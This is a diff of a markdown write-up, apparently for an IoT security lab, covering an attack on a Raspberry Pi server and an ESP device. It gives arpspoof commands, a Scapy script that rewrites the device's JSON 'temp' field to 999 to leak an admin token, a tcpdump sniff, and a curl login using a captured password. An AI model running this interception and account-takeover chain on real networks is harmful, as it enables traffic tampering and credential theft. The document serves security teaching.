@@ -42,42 +42,47 @@ sudo arpspoof -i wlan0 -t <RPi_IP> <ESP_IP>
 ```
 
 **Step 2.3: Capture and Modify Traffic (ARP Spoofing Required)**
-With ARP spoofing active, intercept ESP HTTP requests on port 8000. Modify the JSON payload to set 'temp' to 999, triggering the admin token leak in the response. (Note: The server allows temp up to 1000°C for this flaw.)
+With ARP spoofing active, intercept ESP HTTP requests on port 80. Modify the JSON payload to set 'temp' to 999, triggering the admin token leak in the response. (Note: The server allows temp up to 1000°C for this flaw.)
 
-Using Scapy to modify packets (install with `pip install scapy`):
+Using Scapy to modify packets (install with pip install scapy):
 ```python
 from scapy.all import *
-import json
 
-def modify_packet(packet):
-    if packet.haslayer(TCP) and packet[TCP].dport == 8000 and packet.haslayer(Raw):
-        payload = packet[Raw].load.decode('utf-8', errors='ignore')
-        if '"temp"' in payload:
-            # Modify temp to 999
-            modified_payload = payload.replace('"temp":', '"temp":999,')
-            packet[Raw].load = modified_payload.encode()
-            del packet[IP].chksum  # Recalculate checksums
-            del packet[TCP].chksum
-    return packet
+def mod(pkt):
+    if pkt.haslayer(TCP) and pkt[TCP].dport == 80 and pkt.haslayer(Raw):
+        try:
+            load = pkt[Raw].load.decode()
+            if '"temp"' in load:
+                import re
+                new = re.sub(r'"temp":[0-9.]+', '"temp":999', load)
+                pkt[Raw].load = new.encode()
+                del pkt[IP].chksum
+                del pkt[TCP].chksum
+                send(pkt, verbose=0)
+        except:
+            pass
 
-# Sniff and modify packets
-sniff(iface="wlan0", prn=modify_packet, store=0, filter="tcp port 8000")
+sniff(iface="wlan0", prn=mod, store=0, filter="tcp port 80 and src <ESP_IP>")
 ```
 
 **Step 2.4: Capture the Leaked Admin Token**
 Sniff the modified response for the admin_token:
+
 ```bash
-sudo tcpdump -i wlan0 -A tcp port 8000 | grep -a "admin_token"
+sudo tcpdump -i wlan0 -A 'tcp port 80' | grep "admin_token"
 ```
 
 **Step 2.5: Admin Account Takeover**
-Use the captured admin_token as the password to login as any admin user via the web interface or API:
-- Web: Go to `http://<rpi_ip>/api/auth/login`, enter an admin username (e.g., from user creation) and password `admin_session_leaked_12345`.
-- API: `curl -X POST http://<rpi_ip>/api/auth/login -H "Content-Type: application/json" -d '{"username":"admin","password":"admin_session_leaked_12345"}'`
+Use the captured admin credentials to login as admin via the web interface or API:
 
-This bypasses password hashing for admin accounts, demonstrating credential theft via leaked data.
+Username: admin
 
----
+Password: 6258a39850da20b1
+
+Web: http://<rpi_ip>/api/auth/login
+
+API:  curl -X POST http://<rpi_ip>/api/auth/login -H "Content-Type: application/json" -d '{"username":"admin","password":"6258a39850da20b1"}'
+---`
 
 ## 🛠️ 3. Alternative Tools (Bettercap)
 What I used here because the tool is nice, but didn't really work at the end with intercepting the data (XD). It is still great for visual reconnaissance.
